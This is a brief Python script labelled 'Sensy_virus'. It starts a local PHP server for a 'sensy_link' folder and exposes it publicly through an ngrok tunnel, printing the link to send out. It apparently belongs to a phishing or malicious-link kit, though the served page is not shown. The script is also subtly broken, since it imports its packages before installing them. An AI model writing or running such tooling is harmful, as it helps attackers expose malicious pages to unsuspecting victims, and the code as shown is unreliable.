#Sensy_virus

from os import *
from colorama import *
from subprocess import Popen
from pyngrok import ngrok
system("pip install colorama")
system("pip install pyngrok") 

init()
print('''


      ##############################
      ##############################
      ###[/]   welcome to     [/]###
      ###[/]   sensy link     [/]###
      ###[/]        .         [/]###
      ###[/]        .         [/]###
      ############################## 
      ##############################



    ''')


def server():
    with open("Server","w") as phplog:
        Popen(("php","-S","localhost:4040","-t","../sensy_link"),stderr=phplog,stdout=phplog)
        link = ngrok.connect(4040,"http")
        print(Fore.RED+"[LINK] "+Fore.BLUE+link)
        input("")
server()
